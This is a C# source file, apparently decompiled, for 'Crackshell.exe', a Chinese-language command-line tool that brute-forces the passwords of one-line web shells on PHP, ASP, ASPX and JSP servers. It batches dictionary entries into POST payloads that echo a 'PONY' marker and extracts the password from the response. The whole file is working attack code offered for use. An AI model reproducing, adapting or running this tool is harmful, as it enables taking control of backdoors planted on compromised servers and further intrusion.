using System;
using System.IO;
using System.Diagnostics;
using CsharpHttpHelper;
using CsharpHttpHelper.Enum;

namespace Crackshell
{
    // Token: 0x02000002 RID: 2
    internal class Program
	{
		// Token: 0x06000001 RID: 1
		private static void Main(string[] args)
		{

            if (args.Length < 4)
			{
				Console.WriteLine("-----------------------------------------------------------");
				Console.WriteLine("     程序作者：By孤独的疯子                                ");
                Console.WriteLine("     程序名称：Crackshell.exe                              ");
                Console.WriteLine("     程序描述：本程序主要用于快速爆破一句话木马密码        ");
                Console.WriteLine("     使用说明：一句话地址  密码字典  爆破线程  文件类型    ");
                Console.WriteLine("      查哈希 ：www.chahash.com                             ");
                Console.WriteLine("     搬运请注明来源，查哈希 www.chahash.com  谢谢！        ");
                Console.WriteLine("         注意：如还是不清楚,请看TXT文件内的说明            ");
                Console.WriteLine("-----------------------------------------------------------");
                return;
			}
			string url = args[0];
			string path = args[1];
			int count = Convert.ToInt32(args[2]);
			string script = args[3];
			string text = Program.pass_res(url, path, count, script);
			if (text != "")
			{
				Console.WriteLine("密码为：" + text);
				return;
			}
			Console.WriteLine("没有找到密码，请换个字典尝试");
		}

		// Token: 0x06000002 RID: 2
		public static string pass_res(string url, string path, int count, string script)
		{
			string result;
			try
			{
				StreamReader streamReader = new StreamReader(path);
				int num3 = File.ReadAllLines(path).Length;
				int num2 = (num3 - num3 % count) / count + 1;
				string text = "";
				for (int i = 0; i <= num2; i++)
				{
					string text2 = "";
					for (int j = 0; j <= count; j++)
					{
						string text3 = streamReader.ReadLine();
						if (script != null)
						{
							if (!(script == "php"))
							{
								if (!(script == "asp"))
								{
									if (!(script == "aspx"))
									{
										if (script == "jsp")
										{
											text2 = text3 + "=C&" + text2;
										}
									}
									else
									{
										text2 = string.Concat(new string[]
										{
											text2,
											text3,
											"=Response.Write(\"PONY",
											text3,
											"PONY\")&"
										});
									}
								}
								else
								{
									text2 = string.Concat(new string[]
									{
										text2,
										text3,
										"=response.write(\"PONY",
										text3,
										"PONY\")&"
									});
								}
							}
							else
							{
								text2 = string.Concat(new string[]
								{
									text2,
									text3,
									"=echo @PONY",
									text3,
									"PONY;&"
								});
							}
						}
					}
					if (script == "jsp")
					{
						text2 = "z0=UTF-8&z1=[PONY]&" + text2;
						string text4 = Program.post_res(url, text2);
						if (text4 != "" && text4.Contains("[PONY]"))
						{
							text = string.Concat(new string[]
							{
								"密码区间在",
								(i * count - count).ToString(),
								"行-->",
								(i * count).ToString(),
								"行之间"
							});
							break;
						}
					}
					else
					{
						string text5 = Program.post_res(url, text2);
						if (text5 != "" && text5.Contains("PONY"))
						{
							text = Program.Between(text5, "PONY", "PONY");
							break;
						}
					}
					//Console.WriteLine("正在爆破：->" + count * i);
				}
				result = text;
			}
			catch (Exception ex)
			{
				result = ex.ToString();
			}
			return result;
		}

		// Token: 0x06000003 RID: 3
		public static string post_res(string url, string postdata)
		{
			HttpHelper httpHelper = new HttpHelper();
			HttpItem item = new HttpItem
			{
				URL = url,
				Method = "POST",
				Timeout = 30000,
				ReadWriteTimeout = 30000,
				IsToLower = false,
				Cookie = "",
				UserAgent = "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0",
				Accept = "text/html, application/xhtml+xml, */*",
				ContentType = "application/x-www-form-urlencoded",
				Referer = url,
				Postdata = postdata,
				ResultType = ResultType.String
			};
			return httpHelper.GetHtml(item).Html;
		}

		// Token: 0x06000004 RID: 4
		public static string Between(string str, string leftstr, string rightstr)
		{
			int num = str.IndexOf(leftstr) + leftstr.Length;
			return str.Substring(num, str.IndexOf(rightstr, num) - num);
		}
	}
}
